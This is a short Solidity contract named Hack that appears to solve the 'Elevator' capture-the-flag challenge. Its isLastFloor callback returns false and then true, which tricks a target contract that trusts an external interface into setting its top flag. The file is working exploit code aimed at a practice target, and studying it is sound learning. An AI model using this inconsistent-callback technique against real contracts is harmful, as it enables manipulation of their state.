pragma solidity ^0.8;

interface IElevator {
    function goTo(uint256) external;
    function top() external view returns (bool);
}

contract Hack {
    IElevator private immutable target;
    uint256 count;

    constructor(address _target) {
        target = IElevator(_target);
    }

    function pwn() external {
        target.goTo(1);
        require(target.top(), "not top");
    }

    function isLastFloor(uint256) external returns (bool) {
        count++;
        return count > 1;
    }
}
